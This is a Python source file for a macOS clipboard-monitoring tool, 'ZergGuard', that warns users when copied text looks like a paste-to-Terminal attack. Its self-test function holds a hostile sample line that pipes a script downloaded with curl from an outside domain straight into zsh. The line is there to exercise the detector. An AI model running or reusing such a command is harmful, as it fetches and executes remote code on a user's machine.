#!/usr/bin/env python3
"""ZergGuard clipboard guard — catches paste-to-Terminal attacks before paste."""

from __future__ import annotations

import argparse
import hashlib
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

LIB = Path.home() / ".config" / "zerg-guard" / "lib"
sys.path.insert(0, str(LIB))

from ioc import scan_shell_line, url_is_known_bad  # noqa: E402

LOG = Path.home() / ".config" / "zerg-guard" / "clipboard.log"
POLL_SECS = 2.0


def get_clipboard() -> str:
    try:
        result = subprocess.run(
            ["pbpaste"], capture_output=True, text=True, timeout=2,
        )
        return result.stdout or ""
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def notify(title: str, body: str) -> None:
    body_safe = body.replace('"', '\\"')[:300]
    title_safe = title.replace('"', '\\"')[:60]
    script = (
        f'display notification "{body_safe}" '
        f'with title "ZergGuard" subtitle "{title_safe}" sound name "Sosumi"'
    )
    subprocess.run(["osascript", "-e", script], capture_output=True, timeout=5)


def log_event(content: str, why: str) -> None:
    LOG.parent.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().isoformat(timespec="seconds")
    with LOG.open("a") as f:
        snippet = content[:200].replace("\n", " ")
        f.write(f"[{ts}] {why} :: {snippet}\n")


def evaluate(content: str) -> tuple[bool, str]:
    """Return (is_dangerous, reason)."""
    if not content or len(content) < 4:
        return False, ""
    # Direct known-bad domain in clipboard
    bad = url_is_known_bad(content)
    if bad:
        return True, f"clipboard contains known-bad domain {bad}"
    # Shell red-flag patterns
    for line in content.splitlines():
        hits = scan_shell_line(line)
        if hits:
            _, why = hits[0]
            return True, why
    return False, ""


def watch_loop() -> int:
    print(f"ZergGuard clipboard-guard started (poll={POLL_SECS}s)", file=sys.stderr)
    seen_hash = ""
    while True:
        content = get_clipboard()
        if not content:
            time.sleep(POLL_SECS)
            continue
        h = hashlib.sha256(content.encode("utf-8", errors="replace")).hexdigest()
        if h == seen_hash:
            time.sleep(POLL_SECS)
            continue
        seen_hash = h
        dangerous, why = evaluate(content)
        if dangerous:
            notify(
                "Clipboard looks like a paste-to-Terminal attack",
                f"{why}. DO NOT paste into Terminal.",
            )
            log_event(content, why)
        time.sleep(POLL_SECS)


def cmd_test() -> int:
    payload = 'echo decoy && curl -s https://cvetochek75.com/loader.sh | zsh'
    print(f"Putting test payload on clipboard: {payload[:60]}…", file=sys.stderr)
    subprocess.run(["pbcopy"], input=payload, text=True, timeout=5)
    print("Wait ~3s for daemon to catch it. Check Notification Center.", file=sys.stderr)
    # Local sanity check too
    dangerous, why = evaluate(payload)
    print(f"Local eval: dangerous={dangerous} why={why}", file=sys.stderr)
    return 0 if dangerous else 1


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(prog="zergguard-clipboard-guard")
    ap.add_argument("--test", action="store_true")
    args = ap.parse_args(argv)
    if args.test:
        return cmd_test()
    return watch_loop()


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
